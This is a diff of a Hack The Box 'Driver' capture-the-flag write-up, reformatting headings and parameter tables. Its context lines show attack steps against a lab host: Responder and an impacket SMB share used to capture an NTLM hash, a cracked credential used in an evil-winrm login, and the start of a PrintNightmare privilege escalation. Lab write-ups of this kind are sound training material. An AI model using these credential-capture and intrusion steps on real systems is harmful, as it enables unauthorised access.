@@ -1,10 +1,19 @@
-# By vishok driver
-# htb writeup
+<div class="banner">
+    <div class="ads">
+        <span></span>
+        Get Free - Docs template
+    </div>
+    <h1>
+        <span>¿By Vishok - Hacking Pentesting?</span>
+        Driver HTB
+    </h1>
+</div>
+
 ####
 ####
 ####
 ## Open ports in the target machine
-### Nmap:
+### Nmap
 After spawm machine we need to make a recognition phase, **nmap** is very hepful to discover the ports and services that is running over target machine.
 ####
 <div class="tip">
@@ -31,18 +40,15 @@ echo '
 ' | grep -oE '^([0-9])+' | sed -z 's/\n/,/g'
 ```
 ####
-| Grep param | Description |
+| Grep and sed param | Description |
 | ----- | ----- |
 | -o | Make unique matches |
 | -E | Find other results into a unique string |
-####
-| Sed param | Description |
-| ----- | ----- |
 | -z | Separate lines for each null character, is used to sustitute |
 | s/ | Especify the start of the sustitution |
 | /g | Especify the end of the sustitution |
 ####
-### Nmap version:
+### Nmap version
 ```ruby
 PORT     STATE SERVICE      VERSION
 80/tcp   open  http         Microsoft IIS httpd 10.0
@@ -78,7 +84,7 @@ Host script results:
 ####
 ####
 ## Services that are running in the target machine
-### HTTP:
+### HTTP
 In the target machine is running the *HTTP* service, so a posible aproaching is check this service. We don't have a domain, so is necessary use the direct ip into the browser: http://10.10.11.106. Before we are able to see something the web request us for credentials:
 ####
 <div class="img">
@@ -121,15 +127,12 @@ sudo responder -I tun0 -dwv
 sudo impacket-smbserver test $(pwd) -smb2support
 ```
 ####
-| Responder param | Description |
+| Responder and Impacket param | Description |
 | ----- | ----- |
 | -I | Sspecify the interface to start listen |
 | -d | Enable answers for DHCP broadcast requests |
 | -w | Start the WPAD rogue proxy server |
 | -v | Verbose mode |
-####
-| Impacket param | Description |
-| ----- | ----- |
 | test | Name of the shared resource |
 | $(pwd) | `pwd` command return the current path, and this syncronize the shared resource with the current path |
 | -smb2support | Give support at the version **2** of the *SMB* |
@@ -150,7 +153,7 @@ tony::DRIVER:aaaaaaaaaaaaaaaa:a2352207d9c1fa12776aee6c852b09e1:01010000000000000
 #### 
 #### 
 ## First explotation phase
-### John the ripper:
+### John The Ripper
 We could put this hash into a file to try crack it using **John the ripper**.
 ####
 ```ruby
@@ -189,7 +192,7 @@ evil-winrm -i 10.10.11.106 -u tony -p liltony
 ####
 ####
 ## Second exploit phase (Privilage Escalation)
-### RPC:
+### RPC
 Exist a vulnerability in Windows: *PrintNightmare*, this vulnerability is a critical security flaw in the Windows *Print Spooler* service that allows attackers to execute arbitrary code with SYSTEM-level privileges (the highest level of access on a Windows system). This vulnerability was publicly disclosed in June 2021 and affected multiple versions of Windows, including Windows 7, 8.1, 10, and Windows Server systems.
 ####
 The way to discover if a target machine is vulnerable at this is dump a RPC interfaces to found one or both: [*MS-RPRN*, *MS-PAR*], for do that, we need to use a **impacket** tool:
